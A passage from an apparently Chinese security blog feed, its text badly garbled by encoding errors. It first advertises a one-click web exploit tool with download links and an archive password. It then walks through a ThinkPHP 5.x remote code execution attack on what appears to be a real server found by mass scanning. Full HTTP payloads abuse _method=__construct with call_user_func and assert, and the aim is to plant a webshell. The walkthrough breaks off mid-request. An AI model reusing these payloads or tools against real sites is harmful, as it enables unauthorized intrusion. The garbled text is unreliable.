¡å›­ä¿¡æ¯ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> ç« ç®¡å®¶ saveUser.htm ä»»æ„ç”¨æˆ·åˆ›å»ºæ¼æ´<br/><br> ALR-F800å‘½ä»¤æ‰§è¡Œæ¼æ´<br/><br> èµ›ä¼ä¸šç®¡ç†ç³»ç»Ÿ AuthToken&#x2F;Index èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´<br/><br> äº‘æ—¶ç©ºç¤¾ä¼šåŒ–å•†ä¸šERPç³»ç»Ÿ user&#x2F;online èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´<br/><br> WookTeam sqlæ³¨å…¥å’Œxxxæ¼æ´<br/><br> ä¹æ€OAæ–‡ä»¶è¯»å–æ¼æ´<br/><br> ç”¨å‹U8-CRM importä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> æ¯AIç½‘ç»œè¿ç»´å¹³å°RCE<br/><br> æ³›å¾®  e-cology 9 sqlæ³¨å…¥æ¼æ´<br/><br> è“å‡ŒEKPå­˜åœ¨sys_ui_componentè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´<br/><br> æ­å·ä¸‰æ±‡ç½‘debug rce<br/><br> ç”¨å‹NCç³»ç»ŸFileManagerä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> èµ›é€šæ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»ŸgetAllUsersä¿¡æ¯æ³„éœ²<br/><br> æŸæœè£…å“ç‰Œç³»ç»Ÿä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> æŒ‡æŒ¥è°ƒåº¦å¹³å°rceæ¼æ´(ç»•è¿‡waf)<br/><br> è‡´è¿œOAä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> è‡´è¿œäº’è”FE ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> æ•™å­¦è§†é¢‘åº”ç”¨äº‘ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> æ½®GSä¼ä¸šç®¡ç†è½¯ä»¶ååºåˆ—åŒ–<br/></p><p>é¢„è®¡hwç»“æŸåæ”¾å‡ºæœ€å¤§æ¡æ•°10ä¸‡æ¡çš„è½¯ä»¶å¹¶ä¸”é›†æˆæœ€æ–°æ¼æ´expã€‚æ•¬è¯·æœŸå¾…!!!ã€‚æ¡†æ¶ä¸º2024-04 expä¸ºæœ€æ–°ç‰ˆæœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261636141.png" alt="æœ€æ–°ç‰ˆæœ¬æˆªå›¾"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261639801.png" alt="æ¨¡å—åˆ—è¡¨ä¸€"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261638819.png" alt="æ¨¡å—åˆ—è¡¨äºŒ"></p><h2 id="è½¯ä»¶ä»‹ç»"><a href="#è½¯ä»¶ä»‹ç»" class="headerlink" title="è½¯ä»¶ä»‹ç»"></a>è½¯ä»¶ä»‹ç»</h2><p>WebFrameworkTools 5.3 - çº¢é˜Ÿç»¼åˆæ¸—é€æµ‹è¯•åˆ©å™¨<br>æ¥æºç½‘ç«™: <a href="https://blog.csdn.net/gitblog_00073/article/details/139490114">https://blog.csdn.net/gitblog_00073/article/details/139490114</a></p><p><strong>é¡¹ç›®ä»‹ç»</strong></p> <p>WebFrameworkTools æ˜¯ä¸€æ¬¾å¼ºå¤§çš„çº¢é˜Ÿæ¸—é€æµ‹è¯•å·¥å…·&#xff0c;ä¸“ä¸ºä¸“ä¸šå®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•è€…è®¾è®¡ã€‚å®ƒé›†æˆäº†å¤šç§Webæ¼æ´çš„POCå’ŒEXP&#xff0c;æ—¨åœ¨ç®€åŒ–å’ŒåŠ é€ŸWebåº”ç”¨çš„å®‰å…¨è¯„ä¼°è¿‡ç¨‹ã€‚è½¯ä»¶çš„æœ€æ–°ç‰ˆæœ¬5.3å¸¦æ¥äº†è¯¸å¤šæ”¹è¿›å’Œæ–°çš„æ¼æ´åº“&#xff0c;ä½¿å¾—å®‰å…¨ä¸“å®¶èƒ½å¤Ÿå¿«é€Ÿå“åº”æ–°å‡ºç°çš„å¨èƒã€‚</p> <p><strong>é¡¹ç›®æŠ€æœ¯åˆ†æ</strong></p> <p>è¯¥å·¥å…·åŸºäºC#ç¼–ç¨‹è¯­è¨€æ„å»º&#xff0c;å…¶æ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬&#xff1a;</p> <ol><li><strong>ä¸€é”®ç”Ÿæˆåˆ©ç”¨EXP</strong>: å³ä½¿ä¸å…·å¤‡ç¼–ç¨‹èƒŒæ™¯çš„ç”¨æˆ·ä¹Ÿèƒ½è½»æ¾ç”Ÿæˆexploitã€‚</li><li><strong>è‡ªå®šä¹‰DLLåŠŸèƒ½</strong>: å¯¹äºæœ‰ç»éªŒçš„å¼€å‘è€…æ¥è¯´&#xff0c;å¯ä»¥é€šè¿‡ç¼–å†™è‡ªå·±çš„æ’ä»¶æ¥æ‰©å±•å·¥å…·åŠŸèƒ½ã€‚</li><li><strong>å†…ç½®æ¼æ´åº“</strong>: åŒ…å«äº†å¤§é‡çš„Webæ¼æ´exploits&#xff0c;æ¶µç›–å„ç§æµè¡Œæ¡†æ¶å’Œå¹³å°ã€‚</li><li><strong>æ¨¡å—å†…éƒ¨åŒ–</strong>: ä¼˜åŒ–äº†è½¯ä»¶ç»“æ„&#xff0c;å‡å°ä½“ç§¯&#xff0c;ä¾¿äºæºå¸¦å’Œä½¿ç”¨ã€‚</li><li><strong>æ”¯æŒ.NET Coreçº¿ç¨‹æ± </strong>: æé«˜æ€§èƒ½&#xff0c;å¢å¼ºDLLæ‰§è¡Œæ•ˆç‡ã€‚</li><li><strong>æ™ºèƒ½HTTPå¤´éƒ¨Fuzzer</strong>: å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„è„†å¼±ç‚¹ã€‚</li><li><strong>è‡ªåŠ¨åŒ–æ¼æ´æ£€æµ‹</strong>: å¯å¤„ç†å¤§é‡URL&#xff0c;å®ç°å¤§è§„æ¨¡æµ‹è¯•ã€‚</li></ol> <p><strong>åº”ç”¨åœºæ™¯</strong></p> <p>WebFrameworkToolsé€‚ç”¨äºä»¥ä¸‹åœºæ™¯&#xff1a;</p> <ol><li><strong>ä¼ä¸šå®‰å…¨å»ºè®¾</strong>: ç”¨äºåˆæ³•æˆæƒçš„å®‰å…¨æµ‹è¯•&#xff0c;å¸®åŠ©åŠ å¼ºç³»ç»Ÿé˜²æŠ¤ã€‚</li><li><strong>æ¸—é€æµ‹è¯•</strong>: å¿«é€ŸéªŒè¯Webåº”ç”¨ä¸­çš„å®‰å…¨æ¼æ´&#xff0c;æœ‰æ•ˆæå‡æµ‹è¯•æ•ˆç‡ã€‚</li><li><strong>æ•™è‚²ç ”ç©¶</strong>: å­¦ä¹ Webå®‰å…¨å’Œæ¸—é€æµ‹è¯•æŠ€å·§&#xff0c;å®è·µå®‰å…¨æ”»é˜²ã€‚</li><li><strong>å®‰å…¨åº”æ€¥å“åº”</strong>: å½“æ–°æ¼æ´æŠ«éœ²æ—¶&#xff0c;å¿«é€Ÿå¯¹ç›®æ ‡ç¯å¢ƒè¿›è¡Œå®‰å…¨æ‰«æã€‚</li></ol> <p><strong>é¡¹ç›®ç‰¹ç‚¹</strong></p> <ol><li><strong>é«˜åº¦é›†æˆ</strong>: å°†å¤šç§å·¥å…·&#xff08;å¦‚Vulmapã€Http Fuzzerå’ŒExploit Generator&#xff09;çš„åŠŸèƒ½èä¸ºä¸€ä½“&#xff0c;å®ç°å¤šåŠŸèƒ½ä¸€ç«™å¼æ“ä½œã€‚</li><li><strong>ä¾¿æ·æ˜“ç”¨</strong>: ç”¨æˆ·å‹å¥½ç•Œé¢å’Œä¸€é”®å¼æ“ä½œé™ä½äº†ä½¿ç”¨é—¨æ§›ã€‚</li><li><strong>æŒç»­æ›´æ–°</strong>: æŒç»­è·Ÿè¿›æœ€æ–°çš„æ¼æ´ä¿¡æ¯&#xff0c;ä¿æŒæ¼æ´æ•°æ®åº“çš„å®æ—¶æ€§ã€‚</li><li><strong>æºä»£ç å®‰å…¨</strong>: å¼€æºè®¡åˆ’å³å°†å¯åŠ¨&#xff0c;ç”¨æˆ·å¯å®¡æŸ¥ä»£ç ç¡®ä¿é€æ˜åº¦å’Œå®‰å…¨æ€§ã€‚</li><li><strong>åˆè§„æ€§</strong>: æ˜ç¡®ä½¿ç”¨æ¡æ¬¾&#xff0c;å¼ºè°ƒåˆæ³•ä½¿ç”¨&#xff0c;ä¿æŠ¤ç”¨æˆ·å…å—æ³•å¾‹é£é™©ã€‚</li></ol> <p><strong>ç»“è®º</strong></p> <p>WebFrameworkTools 5.3ä»¥å…¶å…¨é¢çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§&#xff0c;æˆä¸ºäº†çº¢é˜Ÿæ¸—é€æµ‹è¯•é¢†åŸŸçš„ä¸€æ¬¾å¿…å¤‡å·¥å…·ã€‚æ— è®ºæ˜¯æ–°æ‰‹è¿˜æ˜¯ç»éªŒä¸°å¯Œçš„å®‰å…¨ä¸“å®¶&#xff0c;éƒ½èƒ½ä»ä¸­å—ç›Šã€‚éšç€æºä»£ç å³å°†å¯¹å¤–å¼€æº&#xff0c;æ›´å¤šå®‰å…¨ç¤¾åŒºçš„è´¡çŒ®å°†ä¼šè¿›ä¸€æ­¥ä¸°å¯Œå’Œå®Œå–„è¿™ä¸ªé¡¹ç›®ã€‚å¦‚æœä½ ä»äº‹ç›¸å…³é¢†åŸŸçš„å·¥ä½œ&#xff0c;ä¸å¦¨å°è¯•ä¸€ä¸‹WebFrameworkTools&#xff0c;è®©å®‰å…¨æµ‹è¯•å˜å¾—æ›´åŠ é«˜æ•ˆã€‚</p>               <p>ä½¿ç”¨æ–¹å¼è¯·å‚è€ƒåšå®¢æˆ–è€…githubã€‚æˆ–è€…åŠ å…¥é¢‘é“ã€‚<br>ä¸‹è½½åœ°å€:<br><a href="https://www.upload.ee/files/16822507/hwok.7z.html">https://www.upload.ee/files/16822507/hwok.7z.html</a> è½¯ä»¶4æœˆä»½ç‰ˆæœ¬expæ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ã€‚æ¡†æ¶æ˜¯4æœˆä»½çš„è¿™ä¸ªç‰ˆæœ¬è¾¾åˆ°ä¸€å®šç¨‹åº¦å°±ä¼šå‡ºç°å¥”æºƒã€‚æ‰€ä»¥è®¾ç½®äº†æœ€å¤§æ¡æ•°5000æ¡ã€‚2024-10-31æ—¥è½¯ä»¶è¿‡æœŸã€‚æ…¢æ…¢ç”¨å§ã€‚å°±åˆ«åˆ†äº«äº†è‡ªå·±ç”¨å°±è¡Œäº†ã€‚æˆæƒæ–‡ä»¶ä¸‹è½½:<a href="https://www.upload.ee/files/16851948/license.7z.html">https://www.upload.ee/files/16851948/license.7z.html</a> è§£å‹å¯†ç :GL@kEzDu&amp;lh7 æ³¨æ„:ä¸‹è½½çš„æ—¶å€™æœ‰å¹¿å‘Šå¦‚æœå¼¹åˆ°åˆ«çš„ç½‘ç«™å…³é—­ã€‚å›åˆ°åŸæ¥çš„åœ°æ–¹åœ¨ç‚¹å‡»ä¸‹è½½ã€‚ç›´åˆ°å¼¹å‡ºhwok.7zæ‰æ˜¯çœŸæ­£ä¸‹è½½çš„è½¯ä»¶ã€‚å¦ä¸€ä¸ªä¹Ÿä¸€æ ·ã€‚è‡ªå·±ç¢ç£¨å§ã€‚</p><h2 id="è½¯ä»¶å·²ç»å‘å¸ƒæœ€æ–°ç‰ˆæœ¬æœ€æ–°ç‰ˆæœ¬ä¸Šè¿°æ¼æ´expå…¨éƒ¨é›†æˆå¹¶ä¸”expæ›´æ–°åˆ°2024-08-26"><a href="#è½¯ä»¶å·²ç»å‘å¸ƒæœ€æ–°ç‰ˆæœ¬æœ€æ–°ç‰ˆæœ¬ä¸Šè¿°æ¼æ´expå…¨éƒ¨é›†æˆå¹¶ä¸”expæ›´æ–°åˆ°2024-08-26" class="headerlink" title="è½¯ä»¶å·²ç»å‘å¸ƒæœ€æ–°ç‰ˆæœ¬æœ€æ–°ç‰ˆæœ¬ä¸Šè¿°æ¼æ´expå…¨éƒ¨é›†æˆå¹¶ä¸”expæ›´æ–°åˆ°2024-08-26"></a>è½¯ä»¶å·²ç»å‘å¸ƒæœ€æ–°ç‰ˆæœ¬æœ€æ–°ç‰ˆæœ¬ä¸Šè¿°æ¼æ´expå…¨éƒ¨é›†æˆå¹¶ä¸”expæ›´æ–°åˆ°2024-08-26</h2><p>è½¯ä»¶æœ€æ–°ç‰ˆæœ¬ç•Œé¢:</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408311201633.png" alt="è½¯ä»¶æœ€æ–°ç‰ˆæœ¬ç•Œé¢"></p><p>è½¯ä»¶ä¸‹è½½åœ°å€:<br> <a href="https://www.upload.ee/files/17043937/webframeworkstools-10w-new.7z.html">https://www.upload.ee/files/17043937/webframeworkstools-10w-new.7z.html</a> (æ— bugç‰ˆæœ¬)<br/><br>è½¯ä»¶keyä¸‹è½½åœ°å€:<br>  <a href="https://www.upload.ee/files/17043398/license-10w.7z.html">https://www.upload.ee/files/17043398/license-10w.7z.html</a> (key 10wæ¡)<br/><br>å¦å¤–dllç”Ÿæˆå·¥å…·å¦‚æœä¸èƒ½ä½¿ç”¨ä¸‹è½½ 5.3 betaç‰ˆæœ¬ä¸­çš„ä¿®æ”¹æœ¬åœ°æ—¶é—´å°±å¯ä»¥ä½¿ç”¨äº†ã€‚æ²¡æœ‰å•ç‹¬ç”Ÿæˆdllç”Ÿæˆå™¨ã€‚æ³¨æ„!!!ä¹‹å‰ä¸‹è½½çš„ç‰ˆæœ¬å­˜åœ¨bugè¯·é‡æ–°ä¸‹è½½ æ— bugç‰ˆæœ¬å’Œkey10 wæ¡è½¯ä»¶å’Œkeyã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 5.x rce æ‰“æ³•æ€»ç»“(ä¸€)</title>
      <link href="/penetrationtest/2024/07/articles/9c5868b69dac664d/"/>
      <url>/penetrationtest/2024/07/articles/9c5868b69dac664d/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>å¤§å®¶åœ¨ä½¿ç”¨æˆ‘ä»¬çš„å·¥å…·ä¸­,ååº”è¯´æ‰«æå‡ºæ¥æœ‰æ¼æ´ä½†æ˜¯å°±æ˜¯ä¸ä¼šæ‰“ã€‚ä»¥å‰è¯´å®è¯æˆ‘ä¹Ÿæ²¡æ€ä¹ˆæè¿‡thinkphpçš„ç«™ç‚¹ã€‚æ­£å¥½è¶ç€å¤§å®¶ååº”çš„é—®é¢˜å®æˆ˜ä¸€ä¸‹ã€‚é¡ºä¾¿æŠŠè¿™ä¸ªç¼–å†™åˆ°å·¥å…·é‡Œé¢æ–¹ä¾¿è‡ªåŠ¨åŒ–ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯èƒ½æ‰“æ‰€æœ‰çš„ç«™åªæ˜¯èƒ½æ‰“éƒ¨åˆ†ç«™ç‚¹è¿™äº›æ‰“æ³•ã€‚åç»­ç­‰å·¥å…·å®æˆ˜è¯å¤šçš„æ—¶å€™æˆ‘ä»¬åœ¨æ€»ç»“æ¯”è¾ƒå¥½çš„é€šç”¨æ–¹æ³•ã€‚å½“ç„¶ä¸‹é¢æ€»ç»“çš„éƒ½æ˜¯äº’è”ç½‘æˆ‘åªä¸è¿‡æ˜¯å®æˆ˜äº†ä¸€ä¸‹ã€‚æœç´¢äº†ä¸€æ³¢è¿™æ–¹é¢çš„èµ„æ–™ä¹Ÿä¸å°‘ã€‚ä½†æ˜¯æ¯”è¾ƒåˆ†æ•£æ‰€ä»¥ç‰¹æ„æäº†ä¸€ç¯‡æ–‡ç« æˆ‘ä»¬æ¥å®æˆ˜ä¸€ä¸‹ã€‚ä¸ºäº†å¤§å®¶éƒ½å¯ä»¥å­¦ä¼šã€‚æˆ‘ä»¬æœ‰çš„å›¾ç‰‡å°±ä¸æ‰“é©¬èµ›å…‹äº†(ä½¿ç”¨æ°´å°ä»£æ›¿ä¸€ä¸‹)ã€‚æœ‰äº›æ˜¯æ ¹æ®ç³»ç»Ÿæ€»ç»“å‡ºæ¥çš„æ‰“æ³•ã€‚å½“ç„¶è¿™éƒ½ä¸å…¨åç»­ç€é‡é‡åˆ°çš„æƒ…å½¢ä¸‹é¢åœ¨æ€»ç»“å…ˆæ€»ç»“ä¸€æ³¢æ”¾å‡ºæ¥ä¸€ä¸‹ã€‚åºŸè¯ä¸å¤šè¯´å¼€å¹²ã€‚</p><h2 id="æ¼æ´å‘ç°"><a href="#æ¼æ´å‘ç°" class="headerlink" title="æ¼æ´å‘ç°"></a>æ¼æ´å‘ç°</h2><p> ä½¿ç”¨è½¯ä»¶æ‰«æå‡ºæ¥çš„ç«™ç‚¹å¦‚ä¸‹å›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271402467.png" alt="è½¯ä»¶æ‰«ææˆªå›¾"><br>æˆ‘ä»¬ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºè½¯ä»¶æ‰«æå‡ºè¿™ä¸ªç«™ç‚¹å­˜åœ¨æ¼æ´ã€‚<br>æˆ‘ä»¬ä½¿ç”¨brupå¤ç°ä¸€ä¸‹</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80_method=__construct&amp;method=GET&amp;filter[]=var_dump&amp;get[]=a6d3e827b198d120okhacked</span></code></pre><p>æˆ‘ä»¬çœ‹å›æ˜¾ã€‚è¯´æ˜å­˜åœ¨æ¼æ´ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271405298.png" alt="burpæµ‹è¯•"><br>æˆ‘ä»¬çœ‹phpinfoå‡½æ•°è¢«ç¦ç”¨æ²¡æœ‰</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 68_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;get[]=phpinfo</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271408949.png" alt="è¯´æ˜æ²¡æœ‰è¢«ç¦ç”¨æ­£å¸¸"><br>ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°disable_functions  æˆ‘ä»¬çœ‹åˆ°å‡ ä¹å§ä»£ç æ‰§è¡Œå‡½æ•°å…¨éƒ¨ç¦ç”¨äº†ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢phpæ˜¯ 7.0æ²¡ç¦ç”¨assertæ‰€ä»¥å¯ä»¥ç›´æ¥ä½¿ç”¨assert getshell</p><pre class="language-java" data-language="java"><code class="language-java">passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>chroot<span class="token punctuation">,</span>chgrp<span class="token punctuation">,</span>chown<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>ini_alter<span class="token punctuation">,</span>ini_restore<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>openlog<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>readlink<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>popepassthru<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>apache_setenv</code></pre><h2 id="ä¸€-ä»£ç æ‰§è¡Œgetshell"><a href="#ä¸€-ä»£ç æ‰§è¡Œgetshell" class="headerlink" title="ä¸€:ä»£ç æ‰§è¡Œgetshell"></a>ä¸€:ä»£ç æ‰§è¡Œgetshell</h2><p>å› ä¸ºphpç‰ˆæœ¬æ˜¯ 7.0ä»¥ä¸‹æ‰€ä»¥å¯ä»¥ä½¿ç”¨assert æ‰§è¡Œphpinfo</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 62_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=phpinfo()</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271415040.png" alt="assertæ‰§è¡Œä»£ç "><br>å†™æ–‡ä»¶å‡½æ•°,ç›´æ¥æ‹¿ä¸‹webshell</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token 